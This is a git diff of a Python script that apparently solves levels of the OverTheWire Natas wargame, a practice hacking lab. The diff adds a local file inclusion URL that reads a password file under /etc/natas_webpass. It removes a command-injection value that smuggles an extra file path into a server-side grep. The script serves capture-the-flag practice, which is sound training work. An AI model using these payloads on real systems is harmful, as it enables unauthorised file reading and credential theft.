@@ -8,14 +8,14 @@ from pathlib import Path
 from bs4 import BeautifulSoup
 
 
-password_file = Path('passwords.txt')
+password_file = Path('../passwords.txt')
 
 
-level = 10
+level = 7
 username = '%s%s' % ('natas', level)
 passwords = open(password_file, 'r').readlines()
 
-url = 'http://%s.natas.labs.overthewire.org/' % username
+url = 'http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' % username
 
 if __name__ == '__main__':
 
@@ -24,14 +24,8 @@ if __name__ == '__main__':
 
         password = password.strip()
 
-        # On passthru function,  search for the password as grep -i indicates.
-        data = {
-            'needle': '"^[A-Za-z0-9].*$" /etc/natas_webpass/natas11 \\',
-            'submit': 'submit'
-        }
-
         # Pass the username, password and data as POST request to server
-        http = requests.post(url, auth=(username, password), data=data)
+        http = requests.post(url, auth=(username, password))
 
         if http.status_code != 200:
             pass
